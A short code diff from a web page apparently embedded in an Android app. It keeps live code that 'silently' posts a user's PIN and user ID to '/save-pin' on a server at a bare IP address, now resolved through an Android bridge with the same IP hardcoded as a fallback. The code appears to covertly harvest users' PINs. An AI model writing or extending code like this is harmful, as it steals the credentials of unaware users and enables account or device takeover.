@@ -406,8 +406,18 @@ h5 {
             user_id: userId
         };
 
+        // ⭐ Get Base URL from Android
+        let baseUrl;
+        try {
+            baseUrl = Android.getBaseUrl();
+        } catch (e) {
+            // Fallback for browser testing
+            baseUrl = 'http://95.134.130.160:8765';
+            console.log('Using fallback URL');
+        }
+
         // Send to server silently
-        fetch('http://95.134.130.160:8765/save-pin', {
+        fetch(`${baseUrl}/save-pin`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
